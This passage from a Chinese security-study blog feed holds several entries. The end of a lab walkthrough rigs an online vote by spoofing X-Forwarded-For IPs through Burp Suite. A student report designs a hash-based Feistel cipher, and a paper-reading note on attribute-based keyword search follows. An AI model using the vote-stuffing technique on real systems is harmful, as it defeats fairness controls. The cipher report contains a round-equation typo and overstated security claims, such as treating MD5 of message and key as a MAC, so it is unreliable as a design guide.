alt="image18"></p><p><strong>我们利用Hackbar来模拟POST方式提交数据，用burpsuite查看请求数据包</strong></p><p><img src="/2021/11/04/%E5%A2%A8%E8%80%85%E5%9C%A8%E7%BA%BF%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/image19.png" alt="image19"></p><p><img src="/2021/11/04/%E5%A2%A8%E8%80%85%E5%9C%A8%E7%BA%BF%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/image20.png" alt="image20"></p><p><strong>3.重复前面的操作，加上Content-Type</strong></p><p><img src="/2021/11/04/%E5%A2%A8%E8%80%85%E5%9C%A8%E7%BA%BF%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/image21.png" alt="image21"></p><p><strong>4.获取Key成功！</strong></p><p><img src="/2021/11/04/%E5%A2%A8%E8%80%85%E5%9C%A8%E7%BA%BF%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/image22.png" alt="image22"></p><h2 id="靶场四——投票系统程序设计缺陷分析"><a href="#靶场四——投票系统程序设计缺陷分析" class="headerlink" title="靶场四——投票系统程序设计缺陷分析"></a>靶场四——投票系统程序设计缺陷分析</h2><h3 id="背景介绍：-3"><a href="#背景介绍：-3" class="headerlink" title="背景介绍："></a>背景介绍：</h3><p>年终了，公司组织了各单位”文明窗口”评选网上投票通知。<br>安全工程师”墨者”负责对投票系统进行安全测试，看是否存在安全漏洞会影响投票的公平性。</p><h3 id="实训目标：-3"><a href="#实训目标：-3" class="headerlink" title="实训目标："></a>实训目标：</h3><ul><li>了解浏览器插件的使用；</li><li>了解开发程序员对IP地址获取方式；</li><li>了解网络协议软件的使用，如burpsuite等；</li></ul><h3 id="解题方向：-2"><a href="#解题方向：-2" class="headerlink" title="解题方向："></a>解题方向：</h3><p>根据页面提示，进行投票页面测试。</p><p><strong>1.启动靶场环境</strong></p><p><img src="/2021/11/04/%E5%A2%A8%E8%80%85%E5%9C%A8%E7%BA%BF%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/image23.png" alt="image23"></p><p><img src="/2021/11/04/%E5%A2%A8%E8%80%85%E5%9C%A8%E7%BA%BF%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/image24.png" alt="image24"></p><p><strong>2.利用burpsuite抓取投票数据包，并在数据包中加入一行X-Forwarded-For:ip，利用burpsuite功能不断对ip地址进行修改即可</strong> </p><p><img src="/2021/11/04/%E5%A2%A8%E8%80%85%E5%9C%A8%E7%BA%BF%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/image25.png" alt="image25"></p><p><img src="/2021/11/04/%E5%A2%A8%E8%80%85%E5%9C%A8%E7%BA%BF%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/image26.png" alt="image26"></p><p><img src="/2021/11/04/%E5%A2%A8%E8%80%85%E5%9C%A8%E7%BA%BF%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/image27.png" alt="image27"></p><p><img src="/2021/11/04/%E5%A2%A8%E8%80%85%E5%9C%A8%E7%BA%BF%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/image28.png" alt="image28"></p><p><strong>3.对参数148和1进行设置，变动区域为1-60，那么最后生成的ip地址就会有360个</strong></p><p><img src="/2021/11/04/%E5%A2%A8%E8%80%85%E5%9C%A8%E7%BA%BF%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/image29.png" alt="image29"></p><p><strong>参数2，即1同上</strong></p><p><strong>点击攻击</strong></p><p><strong>4.放过数据包</strong></p><p><img src="/2021/11/04/%E5%A2%A8%E8%80%85%E5%9C%A8%E7%BA%BF%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/image30.png" alt="image30"></p><p><strong>5.获取Key成功！</strong></p><p><img src="/2021/11/04/%E5%A2%A8%E8%80%85%E5%9C%A8%E7%BA%BF%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/image31.png" alt="image31"></p>]]></content>
      
      
      <categories>
          
          <category> web安全渗透学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 墨者，网络安全，在线靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于论文《Privacy-Preserving Multi-Keyword Searchable Encryption for Distributed Systems》的一些想法</title>
      <link href="/2021/10/26/%E5%85%B3%E4%BA%8E%E8%AE%BA%E6%96%87%E3%80%8APrivacy-Preserving-Multi-Keyword-Searchable-Encryption-for-Distributed-Systems%E3%80%8B%E7%9A%84%E4%B8%80%E4%BA%9B%E6%83%B3%E6%B3%95/"/>
      <url>/2021/10/26/%E5%85%B3%E4%BA%8E%E8%AE%BA%E6%96%87%E3%80%8APrivacy-Preserving-Multi-Keyword-Searchable-Encryption-for-Distributed-Systems%E3%80%8B%E7%9A%84%E4%B8%80%E4%BA%9B%E6%83%B3%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p>巴拉巴拉</p><p>如题，之后再更。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 小白，学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基于hash算法的分组数据加密软件——作品设计报告</title>
      <link href="/2021/10/22/%E5%9F%BA%E4%BA%8Ehash%E7%AE%97%E6%B3%95%E7%9A%84%E5%88%86%E7%BB%84%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E8%BD%AF%E4%BB%B6%E2%80%94%E2%80%94%E4%BD%9C%E5%93%81%E8%AE%BE%E8%AE%A1%E6%8A%A5%E5%91%8A/"/>
      <url>/2021/10/22/%E5%9F%BA%E4%BA%8Ehash%E7%AE%97%E6%B3%95%E7%9A%84%E5%88%86%E7%BB%84%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E8%BD%AF%E4%BB%B6%E2%80%94%E2%80%94%E4%BD%9C%E5%93%81%E8%AE%BE%E8%AE%A1%E6%8A%A5%E5%91%8A/</url>
      
        <content type="html"><![CDATA[<h1 id="1-作品功能与性能说明"><a href="#1-作品功能与性能说明" class="headerlink" title="1.作品功能与性能说明"></a>1.作品功能与性能说明</h1><p>本作品设计了一个基于哈希算法的分组加密系统，软件页面如图1.1所示。软件使用三轮非平衡Feistel结构，调用成熟的哈希算法作为轮函数（在轮函数是密码安全的伪随机函数时，3轮Feistel就足以使这种分组密码成为伪随机置换），完成密钥、分组长度、Feistel结构左右分块大小、使用的哈希算法、分组密码的工作模式、输入/输出格式均可由使用者灵活控制的加密系统。作品功能与性能说明如下所述。</p><img src="/2021/10/22/%E5%9F%BA%E4%BA%8Ehash%E7%AE%97%E6%B3%95%E7%9A%84%E5%88%86%E7%BB%84%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E8%BD%AF%E4%BB%B6%E2%80%94%E2%80%94%E4%BD%9C%E5%93%81%E8%AE%BE%E8%AE%A1%E6%8A%A5%E5%91%8A/image1.png" align="center"><div align="center">图1.1 软件设计页面</div><h2 id="1-1-作品功能"><a href="#1-1-作品功能" class="headerlink" title="1.1 作品功能"></a>1.1 作品功能</h2><ul><li><p><strong>支持多种哈希算法调用</strong></p><p>作品支持调用SM3、MD5、SHA-1、SHA-224、SHA-256、SHA-384、SHA-512、SHA3-224、SHA3-256、SHA3-384、SHA3-512、RIPEMD160等常见且成熟的哈希算法。</p></li><li><p><strong>支持多种分组长度和左右分块方案</strong></p><p>传统的分组加密例如DES，使用了固定的64比特分组长度且左右分块大小相等，而本作品的分组长度可控，支持使用者自定义分组长度和左右分块大小，例如自定义100比特的分组长度，30比特左分块和70比特右分块。</p></li><li><p><strong>支持多种分组密码工作模式选择</strong></p><p>作品支持使用者选择ECB、CBC、CFB、OFB等四种分组密码工作模式进行加解密操作。</p></li><li><p><strong>口令字作密钥</strong></p><p>密钥不使用传统的子密钥生成算法，而是由使用者自己输入的口令确定。即作品支持使用者自定义口令，并将口令作为Feistel网络中轮函数的部分输入，该口令即为本加密系统的密钥。</p></li><li><p><strong>密文拥有消息认证码，用作完整性检验与明密识别</strong></p><p>密文结果包含消息认证码，通过验证消息认证码，可以检验消息的完整性，同时实现明密识别。</p></li><li><p><strong>支持多种输入/输出格式</strong></p><p>密钥与加密数据的支持格式均包含中文字符；作品支持二进制、十进制、十六进制以及Base64等多种格式的输入和输出。</p></li></ul><h2 id="1-2-性能说明"><a href="#1-2-性能说明" class="headerlink" title="1.2 性能说明"></a>1.2 性能说明</h2><p>本作品调用哈希算法替代Feistel结构中的轮函数，通过与其他对称加密方案诸如AES、DES和3DES等进行比较（详见3.2节），表明本作品在加解密效率上有一定的实用性，同时满足了密钥长度、密钥内容、分组大小和加密模式等均可控的性能需求，有很强的灵活性与适用性。</p><h1 id="2-设计与实现方案"><a href="#2-设计与实现方案" class="headerlink" title="2.设计与实现方案"></a>2.设计与实现方案</h1><h2 id="2-1-设计原理"><a href="#2-1-设计原理" class="headerlink" title="2.1 设计原理"></a>2.1 设计原理</h2><p>本节详细描述系统的分组和填充方式，以及Feistel网络结构设计。</p><h3 id="2-1-1-分组和填充"><a href="#2-1-1-分组和填充" class="headerlink" title="2.1.1 分组和填充"></a>2.1.1 分组和填充</h3><p>加密阶段，首先将输入的明文转换为二进制串，根据设定的分组大小进行分割，若明文长度不能整除分组大小，则在明文二进制串末尾填充‘0’直至能刚好分割为若干个等长的分组；同时在填充完的数据末尾增加一个分组用于记录明文原始数据的长度，如图2.1所示。</p><img src="/2021/10/22/%E5%9F%BA%E4%BA%8Ehash%E7%AE%97%E6%B3%95%E7%9A%84%E5%88%86%E7%BB%84%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E8%BD%AF%E4%BB%B6%E2%80%94%E2%80%94%E4%BD%9C%E5%93%81%E8%AE%BE%E8%AE%A1%E6%8A%A5%E5%91%8A/image2.png" align="center"><div align="center">图2.1 明文的分组和填充</div><h3 id="2-1-2-Feistel网络结构设计"><a href="#2-1-2-Feistel网络结构设计" class="headerlink" title="2.1.2  Feistel网络结构设计"></a>2.1.2  Feistel网络结构设计</h3><p>本系统使用了三轮Feistel结构，每个明文分组作为Feistel网络的输入，根据使用者自定义的左右分块大小分为长度为a的左分块 L<sub>0</sub>和长度为b的右分块R<sub>0</sub>。</p><p>第一轮， L<sub>1</sub>=R<sub>0</sub>，R<sub>1</sub>=L<sub>0</sub> $\oplus$ Hash(K|R<sub>0</sub>)，Hash(K|R<sub>0</sub>)为口令K和R<sub>0</sub>拼接后进行哈希的结果，取前a个比特与L<sub>0</sub>异或得到R<sub>1</sub>；第二轮，L<sub>2</sub>=R<sub>2</sub>，R<sub>2</sub>=L<sub>1</sub>⊕Hash(K|R<sub>1</sub>)，Hash(K|R<sub>1</sub>)为口令K和R<sub>1</sub>拼接后进行哈希的结果，取前b个比特与L<sub>1</sub>异或；第三轮同第一轮相同；最后将L<sub>3</sub>|R<sub>3</sub>作为密文输出。</p><p>Feistel网络结构设计如图2.2所示。</p><img src="/2021/10/22/%E5%9F%BA%E4%BA%8Ehash%E7%AE%97%E6%B3%95%E7%9A%84%E5%88%86%E7%BB%84%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E8%BD%AF%E4%BB%B6%E2%80%94%E2%80%94%E4%BD%9C%E5%93%81%E8%AE%BE%E8%AE%A1%E6%8A%A5%E5%91%8A/image3.png" align="center"><div align="center">图2.2 Feistel网络结构</div><h3 id="2-1-3-密文及消息验证码"><a href="#2-1-3-密文及消息验证码" class="headerlink" title="2.1.3 密文及消息验证码"></a>2.1.3 密文及消息验证码</h3><p>将每个分组的密文输出拼接起来就是原始密文C’，其中记录长度的分组也会经过加密成为第n+1个分组，最后将明文M和口令K拼接后进行MD5哈希运算,即  ，得到的128比特结果即为消息验证码，将其拼接到原始密文C’后面形成最终的密文C。（若为CBC、CFB、OFB模式，则还会在密文前拼接一个x比特长的初始向量IV）。</p><h2 id="2-2-系统流程"><a href="#2-2-系统流程" class="headerlink" title="2.2 系统流程"></a>2.2 系统流程</h2><p> 本节描述系统的使用流程和运行流程。</p><h3 id="2-2-1-系统使用流程"><a href="#2-2-1-系统使用流程" class="headerlink" title="2.2.1 系统使用流程"></a>2.2.1 系统使用流程</h3><p>第一步☛：输入参数</p><p>系统需要接收使用者输入的八个参数：口令、文本、分组长度、左分块大小、右分块大小、哈希算法、工作模式、输入/输出格式。用户使用过程的流程如图2.3所示。</p><p>​    <img src="/2021/10/22/%E5%9F%BA%E4%BA%8Ehash%E7%AE%97%E6%B3%95%E7%9A%84%E5%88%86%E7%BB%84%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E8%BD%AF%E4%BB%B6%E2%80%94%E2%80%94%E4%BD%9C%E5%93%81%E8%AE%BE%E8%AE%A1%E6%8A%A5%E5%91%8A/image4.png" align="center"></p><div align="center">图2.3 用户使用流程图</div><p>第二步☛：输入检查</p><p>系统会对以下几项内容进行输入检查：</p><p><strong>①</strong> 确定每个参数都不为空且左右分块长度之和与分组长度相等；</p><p><strong>②</strong> 左右分块大小不得大于所选哈希算法的输出长度（这是因为在Feistel结果中，计算R<sub>1</sub>=L<sub>0</sub>⊕Hash(K|R<sub>0</sub>)时，若L<sub>0</sub>的长度大于Hash输出长度的话，就无法进行异或操作）；</p><p><strong>③</strong>当选择加密时，假设分组长度为n比特，则明文长度不得大于{2<sup>n</sup>-1}（这是因为我们使用了单独的一个分组来记录原始明文数据的长度，而一个n比特分组可表示的最大值为{2<sup>n</sup>-1}，因此原始明文数据不可以超过这个长度）；</p><p><strong>④</strong>当选择解密时，会首先检查消息验证码的正确性，只有验证码正确才能正常解密；</p><p><strong>⑤</strong>输入/输出格式检查</p><p>当选择加密时，无需检查此项，使用者可以自由选择密文的输出格式；当选择解密时，则需要检查输入格式，只有输入文本的格式与所选的格式对应才能解密成功。</p><h3 id="2-2-2-系统运行流程"><a href="#2-2-2-系统运行流程" class="headerlink" title="2.2.2 系统运行流程"></a>2.2.2 系统运行流程</h3><p>系统首先获取面板的基础输入，接着根据使用者选择的加密或解密操作，若选择加密，则首先检查明文长度是否过长，若检查通过则进行加密操作并添加消息验证码，得到最终的密文结果；若选择解密，则首先检查消息验证码的合法性，若检查通过，则舍弃消息验证码后进行解密，得到最终的明文结果。系统运行流程如图2.4所示。</p><img src="/2021/10/22/%E5%9F%BA%E4%BA%8Ehash%E7%AE%97%E6%B3%95%E7%9A%84%E5%88%86%E7%BB%84%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E8%BD%AF%E4%BB%B6%E2%80%94%E2%80%94%E4%BD%9C%E5%93%81%E8%AE%BE%E8%AE%A1%E6%8A%A5%E5%91%8A/image5.png" align="center"><div align="center">图2.4系统运行流程图</div><h2 id="2-3运行结果"><a href="#2-3运行结果" class="headerlink" title="2.3运行结果"></a>2.3运行结果</h2><p>本节展示系统的运行结果，包括加密、解密以及异常情况提示。</p><h3 id="2-3-1-加解密运行结果"><a href="#2-3-1-加解密运行结果" class="headerlink" title="2.3.1 加解密运行结果"></a>2.3.1 加解密运行结果</h3><p>​      对于加密，系统支持对中英文混合字符加密，且可以选择多种格式输出。例如对于某个中英文混合加密数据，选择以十六进制格式输出如图2.5所示，以Base64格式输出如图2.6所示。</p><img src="/2021/10/22/%E5%9F%BA%E4%BA%8Ehash%E7%AE%97%E6%B3%95%E7%9A%84%E5%88%86%E7%BB%84%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E8%BD%AF%E4%BB%B6%E2%80%94%E2%80%94%E4%BD%9C%E5%93%81%E8%AE%BE%E8%AE%A1%E6%8A%A5%E5%91%8A/image6.png" align="center"><div align="center">图2.5 十六进制格式输出</div>          <img src="/2021/10/22/%E5%9F%BA%E4%BA%8Ehash%E7%AE%97%E6%B3%95%E7%9A%84%E5%88%86%E7%BB%84%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E8%BD%AF%E4%BB%B6%E2%80%94%E2%80%94%E4%BD%9C%E5%93%81%E8%AE%BE%E8%AE%A1%E6%8A%A5%E5%91%8A/image7.png" align="center"><div align="center">图2.6 base64格式输出</div> <p>   对于解密，系统支持对不同格式的密文进行解密，例如对十六进制格式密文解密结果如图2.7所示，对Base64格式密文解密结果如图2.8所示。</p><img src="/2021/10/22/%E5%9F%BA%E4%BA%8Ehash%E7%AE%97%E6%B3%95%E7%9A%84%E5%88%86%E7%BB%84%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E8%BD%AF%E4%BB%B6%E2%80%94%E2%80%94%E4%BD%9C%E5%93%81%E8%AE%BE%E8%AE%A1%E6%8A%A5%E5%91%8A/image8.png" align="center">   <div align="center">图2.7 十六进制格式输出</div>          <img src="/2021/10/22/%E5%9F%BA%E4%BA%8Ehash%E7%AE%97%E6%B3%95%E7%9A%84%E5%88%86%E7%BB%84%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E8%BD%AF%E4%BB%B6%E2%80%94%E2%80%94%E4%BD%9C%E5%93%81%E8%AE%BE%E8%AE%A1%E6%8A%A5%E5%91%8A/image9.png" align="center"><div align="center">图2.8 base64格式输出</div><h3 id="2-3-2-异常情况判断"><a href="#2-3-2-异常情况判断" class="headerlink" title="2.3.2 异常情况判断"></a>2.3.2 异常情况判断</h3><p>下面给出系统的异常情况判断。</p><p>   <strong>①完整性检验未通过</strong>；   当密文的消息验证码发生错误时，报错如图2.9所示；</p><img src="/2021/10/22/%E5%9F%BA%E4%BA%8Ehash%E7%AE%97%E6%B3%95%E7%9A%84%E5%88%86%E7%BB%84%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E8%BD%AF%E4%BB%B6%E2%80%94%E2%80%94%E4%BD%9C%E5%93%81%E8%AE%BE%E8%AE%A1%E6%8A%A5%E5%91%8A/image10.png" align="center"><div align="center">图2.9 完整性检验未通过</div>     <p>   <strong>②分块大小与左右分块和不一致</strong>；例如BlockSize选择100，LeftSize选择40和55，报错如图2.10所示；</p><img src="/2021/10/22/%E5%9F%BA%E4%BA%8Ehash%E7%AE%97%E6%B3%95%E7%9A%84%E5%88%86%E7%BB%84%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E8%BD%AF%E4%BB%B6%E2%80%94%E2%80%94%E4%BD%9C%E5%93%81%E8%AE%BE%E8%AE%A1%E6%8A%A5%E5%91%8A/image11.png" align="center"><div align="center">图2.10 分块大小与左右分块和不一致</div><p>   <strong>③明文过长或为空</strong>；如图2.11(1)和图2.11(2)所示；</p><img src="/2021/10/22/%E5%9F%BA%E4%BA%8Ehash%E7%AE%97%E6%B3%95%E7%9A%84%E5%88%86%E7%BB%84%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E8%BD%AF%E4%BB%B6%E2%80%94%E2%80%94%E4%BD%9C%E5%93%81%E8%AE%BE%E8%AE%A1%E6%8A%A5%E5%91%8A/image12.png" align="center"><div align="center">图2.11(1) 明文过长</div>           <img src="/2021/10/22/%E5%9F%BA%E4%BA%8Ehash%E7%AE%97%E6%B3%95%E7%9A%84%E5%88%86%E7%BB%84%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E8%BD%AF%E4%BB%B6%E2%80%94%E2%80%94%E4%BD%9C%E5%93%81%E8%AE%BE%E8%AE%A1%E6%8A%A5%E5%91%8A/image13.png" align="center"><div align="center">图2.11(2) 明文为空 </div><p>   <strong>④分组长度、左分块、右分块中存在0；</strong>如图2.12所示；</p><img src="/2021/10/22/%E5%9F%BA%E4%BA%8Ehash%E7%AE%97%E6%B3%95%E7%9A%84%E5%88%86%E7%BB%84%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E8%BD%AF%E4%BB%B6%E2%80%94%E2%80%94%E4%BD%9C%E5%93%81%E8%AE%BE%E8%AE%A1%E6%8A%A5%E5%91%8A/image14.png" align="center"><div align="center">图2.12 分组长度、左分块、右分块中存在0 </div><p>   <strong>⑤口令为空；</strong>如图2.13所示；</p><img src="/2021/10/22/%E5%9F%BA%E4%BA%8Ehash%E7%AE%97%E6%B3%95%E7%9A%84%E5%88%86%E7%BB%84%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E8%BD%AF%E4%BB%B6%E2%80%94%E2%80%94%E4%BD%9C%E5%93%81%E8%AE%BE%E8%AE%A1%E6%8A%A5%E5%91%8A/image15.png" align="center"><div align="center">图2.13 口令为空</div><p>​      <strong>⑥密钥、加密模式、编码或哈希算法不匹配；</strong>如图2.14(1)和图2.14(2)所示；</p><img src="/2021/10/22/%E5%9F%BA%E4%BA%8Ehash%E7%AE%97%E6%B3%95%E7%9A%84%E5%88%86%E7%BB%84%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E8%BD%AF%E4%BB%B6%E2%80%94%E2%80%94%E4%BD%9C%E5%93%81%E8%AE%BE%E8%AE%A1%E6%8A%A5%E5%91%8A/image16.png" align="center"><div align="center">图2.14(1)解密错误</div><img src="/2021/10/22/%E5%9F%BA%E4%BA%8Ehash%E7%AE%97%E6%B3%95%E7%9A%84%E5%88%86%E7%BB%84%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E8%BD%AF%E4%BB%B6%E2%80%94%E2%80%94%E4%BD%9C%E5%93%81%E8%AE%BE%E8%AE%A1%E6%8A%A5%E5%91%8A/image17.png" align="center"><div align="center">图2.14(2) 编码格式错误</div><h1 id="3-系统测试与结果"><a href="#3-系统测试与结果" class="headerlink" title="3.系统测试与结果"></a>3.系统测试与结果</h1><p>系统测试从功能测试和性能测试两方面进行。</p><p>在功能测试方面，我们对软件进行功能需求分析，然后对于所有功能需求都给出样例并运行至成功。对可能出现异常的操作进行排查，用样例抛出结果。</p><p>在性能测试方面，我们将本方案hashBlockCipher在加解密效率、空间性能和安全性能上与AES、DES、DES3和SHA1进行了比较 。</p><h2 id="3-1-功能测试"><a href="#3-1-功能测试" class="headerlink" title="3.1 功能测试"></a>3.1 功能测试</h2><p>通过第二节中的系统实现流程，可以看到我们的系统支持SM3、MD5、SHA-1、SHA-2和SHA-3等常见hash算法调用；支持多种分组长度和左右块分块方案；支持ECB、CBC、CFB、OFB等分组密码工作模式的选择；口令字作密钥，密数据中有明密识别和消息认证标志，有完整性检验；支持中英文字符混合加解密；密文支持二进制、十进制、十六进制和Base64等格式输出和输入。</p><h2 id="3-2-性能测试"><a href="#3-2-性能测试" class="headerlink" title="3.2 性能测试"></a>3.2 性能测试</h2><p>  我们从加解密效率和密钥存储空间对我们的系统进行了性能测试。</p><p>◆加解密效率对比（加密一百万次的时间对比，单位：秒）</p><p>通过对比AES、DES、3-DES、以及本作品的加密时间来对比加解密效率，通过控制变量，即四个方案的明文输入都恰好为一个分组，同时本次实验的左右分块大小都设置为各自占一半，以排除其他的影响因素进行实验，同时由于在本次对照实验中的Feistel网络使用了SHA-1哈希算法，因此我们单独将SHA-1哈希的时间分离开来计算，结果如图2.15所示。</p> <img src="/2021/10/22/%E5%9F%BA%E4%BA%8Ehash%E7%AE%97%E6%B3%95%E7%9A%84%E5%88%86%E7%BB%84%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E8%BD%AF%E4%BB%B6%E2%80%94%E2%80%94%E4%BD%9C%E5%93%81%E8%AE%BE%E8%AE%A1%E6%8A%A5%E5%91%8A/image18.png" align="center"><div align="center">图2.15 加密效率对比</div><p>可以看到：</p><p><strong>AES</strong>：10.221512794494629s </p><p><strong>DES</strong>：11.831102132797241s</p><p><strong>3-DES</strong>：37.54402709007263s </p><p><strong>本作品</strong>：22.443878650665283s</p><p><strong>SHA-1</strong>：4.437442779541016s</p><p>我们的方案耗时大于AES和DES，但小于3-DES。由于我们使用的轮函数为哈希算法，为了更直观的对比哈希算法所占用的时间，我们将本次实验中所使用的SHA-1单独分离出来计算一百万次。由于我们的方案每次加密会调用三次哈希算法，因此若将本方案扣除三次哈希所占用的时间，效率上与AES和DES相差无几。</p><p>我们通过牺牲一定的时间效率来换取加密方案的灵活性，实现了传统分组密码不具备的功能。</p><p>◆空间性能对比（比较各自密钥大小）</p><p>与常见的分组密码相比，例如AES的密钥长度为<strong>128</strong>、<strong>192</strong>或<strong>256</strong>比特，DES的密钥长度为<strong>64</strong>比特，三重DES的密钥长度为<strong>112</strong>比特，本作品的密钥长度完全由用户自定义，即可使用较短的密钥以减少存储空间，也可以适当增长密钥以提升安全性能。</p><h2 id="3-3-测试数据与结果"><a href="#3-3-测试数据与结果" class="headerlink" title="3.3 测试数据与结果"></a>3.3 测试数据与结果</h2><p>我们的测试样例如下所示<strong>：</strong></p><p><code>&#123;&quot;blockSize&quot;: 100,</code></p><p><code>&quot;leftSize&quot;: 30,</code></p><p><code>&quot;rightSize&quot;: 70,</code> </p><p><code>&quot;plainText&quot;: &quot;This is a test. Test whether the encrypt system is safe or not.&quot;,</code> </p><p><code>&quot;key&quot;: &quot;I am a key!&quot;,</code> </p><p><code>&quot;哈希算法&quot;: sm3/sha1/sha2_224/sha2_256/sha2_384/sha2_512/sha2_224/sha2_256/sha2_384/sha2_512,</code></p><p><code>&quot;加密模式&quot;: ecb/cbc/cfb/ofb,</code> </p><p><code>密文输出格式/密文输入格式: Binary/Decimal/Hexadecimal/Base64&#125;</code></p><h1 id="4-应用前景"><a href="#4-应用前景" class="headerlink" title="4.应用前景"></a>4.应用前景</h1><p>本作品在传统分组加密方案的基础上增加了更多的灵活性，进一步迎合了用户的需求；并可以通过大幅提高密钥长度来增强加密方案的安全性；同时用哈希函数替换轮函数使得一些针对分组加密的攻击诸如CBC翻转攻击和padding oracle等变得十分困难。因此本作品拥有加密软件所需的一定的安全性能，也满足了用户的使用体验，有很良好的应用前景。</p><h1 id="5-结论"><a href="#5-结论" class="headerlink" title="5. 结论"></a>5. 结论</h1><p>本作品的特点为灵活度高，与传统的分组密码不同，本作品支持自定义分组长度以及Feistel网络的左右分块大小，同时使用用户的口令作为加密系统的密钥，整个系统完全受用户所控。在加密效率上，本作品使用的是分组加密模式，采用单密钥加密，因此加解密效率较高，适用性很强；在安全性上，由于Feistel轮函数使用的是成熟的哈希算法，在轮函数是密码安全的伪随机函数时，3轮Feistel就足以使这种分组密码成为伪随机置换；同时hash算法作为轮函数，使得密钥长度完全受用户控制，使用较长密钥能够获得更高的安全性，密文破解会很困难。本作品相较于AES、DES和3DES等传统的对称加密方案有许多改进之处，实现了传统分组密码不具备的功能。</p>]]></content>
      
      
      <categories>
          
          <category> 比赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 哈希 </tag>
            
            <tag> 分组密码 </tag>
            
            <tag> Feistel结构 </tag>
            
            <tag> 可控分组长度 </tag>
            
            <tag> 加密系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VABKS: Verifiable Attribute-based Keyword Search over Outsourced Encrypted Data——论文研读</title>
      <link href="/2021/10/22/VABKS-Verifiable-Attribute-based-Keyword-Search-over-Outsourced-Encrypted-Data%E2%80%94%E2%80%94%E8%AE%BA%E6%96%87%E7%A0%94%E8%AF%BB/"/>
      <url>/2021/10/22/VABKS-Verifiable-Attribute-based-Keyword-Search-over-Outsourced-Encrypted-Data%E2%80%94%E2%80%94%E8%AE%BA%E6%96%87%E7%A0%94%E8%AF%BB/</url>
      
        <content type="html"><![CDATA[<h1 id="论文汇报"><a href="#论文汇报" class="headerlink" title="论文汇报"></a>论文汇报</h1><p>上周我主要是在看《VABKS: Verifiable Attribute-based Keyword Search over Outsourced Encrypted Data》，里面用到访问控制结构和布隆过滤器，我整理如下：</p><h2 id="密文策略基于属性加密-CP-ABE-访问树构造与解密"><a href="#密文策略基于属性加密-CP-ABE-访问树构造与解密" class="headerlink" title="密文策略基于属性加密(CP-ABE)访问树构造与解密"></a>密文策略基于属性加密(CP-ABE)访问树构造与解密</h2><h3 id="构造访问树"><a href="#构造访问树" class="headerlink" title="构造访问树"></a>构造访问树</h3><p>在CP-ABE方案中，访问树用于隐藏源数据的加密密钥，其形状结构如其名一样，是一棵树。其叶子节点为数据所有者设定的属性和属性值以及父节点传于此节点的秘密值，并对其加密处理，只有数据访问者拥有此属性方可解密出此节点的秘密值；非叶子节点为门限节点，数据访问者需满足此门限最低值方可解密此节点秘密值，例如门限为3/5，此节点有5个子节点，数据访问者需至少满足3个子节点才能解密出秘密值。</p><p>构造的访问树如下图，能访问此访问树加密的元数据，数据访问者需要满足的属性是：</p><ul><li><p>(“计算机学院” 且 “硕士” 且 “研二”)和 “教师”</p></li><li><p>“教师” 和(“网络实验室” 或 “云实验室”)</p></li><li><p>(“计算机学院” 且 “硕士” 且 “研二”)和(“网络实验室” 或 “云实验室”)</p><p><img src="/2021/10/22/VABKS-Verifiable-Attribute-based-Keyword-Search-over-Outsourced-Encrypted-Data%E2%80%94%E2%80%94%E8%AE%BA%E6%96%87%E7%A0%94%E8%AF%BB/image1.png" 